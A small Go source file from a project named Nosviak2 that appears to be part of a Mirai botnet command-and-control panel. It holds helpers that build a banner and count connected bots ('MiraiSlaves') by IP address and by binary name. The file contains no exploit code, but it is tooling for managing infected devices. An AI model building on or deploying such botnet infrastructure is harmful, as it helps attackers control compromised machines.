package mirai

import (
	"Nosviak2/core/sources/layouts/toml"
	"Nosviak2/core/sources/tools"
	"strings"
)

//builds the banner system properly
//this will ensure its done without issues
func BuildBanner(src []byte) []byte { //returns byte
	//ranges through the banner properly
	//this will ensure its done without errors
	for que := range toml.ConfigurationToml.Mirai.Banner {
		src = append(src, byte(toml.ConfigurationToml.Mirai.Banner[que]))
	}; return src //returns the source properly without issues
}

//checks how many duplicates appear
//this will ensure its done without any errors
func Appears(target string) int { //returns an int
	var object int = 0
	MiraiSlaves.Mutex.Lock()
	defer MiraiSlaves.Mutex.Unlock()
	
	//ranges through all of the clients properly
	//this will ensure its done without any errors
	for _, client := range MiraiSlaves.All { //ranges through
		//properly compares the different object
		//this will ensure its done without any errors happening
		if strings.Split(client.Conn.RemoteAddr().String(), ":")[0] == strings.Split(target, ":")[0] {
			object++ //adds another instance properly
		}
	}; return object
}


//hows many appears the system shows
//this will ensure its done without errors
func BinAppears(name string) int { //returns an int
	appears := 0 //appears properly
	//ranges through all slaves connected properly
	//this will ensure its done without errors happening
	for _, client := range MiraiSlaves.All { //ranges through
		if tools.Sanatize(name) == tools.Sanatize(client.Name) { //cleans the name properly
			appears++ //appears another system state and safely
		}
	}

	return appears
}
